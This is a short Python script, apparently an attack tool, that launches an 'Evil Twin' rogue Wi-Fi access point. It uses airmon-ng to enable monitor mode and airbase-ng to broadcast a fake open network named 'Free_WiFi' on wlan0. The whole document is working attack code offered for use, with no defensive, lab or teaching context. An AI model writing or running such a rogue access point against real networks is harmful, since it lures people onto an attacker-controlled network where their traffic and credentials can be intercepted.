import subprocess
import logging

def start_fake_wifi(interface, ssid, channel=6):
    """Start a fake Wi-Fi network (Evil Twin Attack)."""
    try:
        logging.info(f"Starting fake Wi-Fi {ssid} on {interface}")
        subprocess.call(['airmon-ng', 'start', interface])
        subprocess.call(['airbase-ng', '-e', ssid, '-c', str(channel), interface])
    except Exception as e:
        logging.error(f"Failed to start fake Wi-Fi: {e}")

if __name__ == '__main__':
    start_fake_wifi('wlan0', 'Free_WiFi')
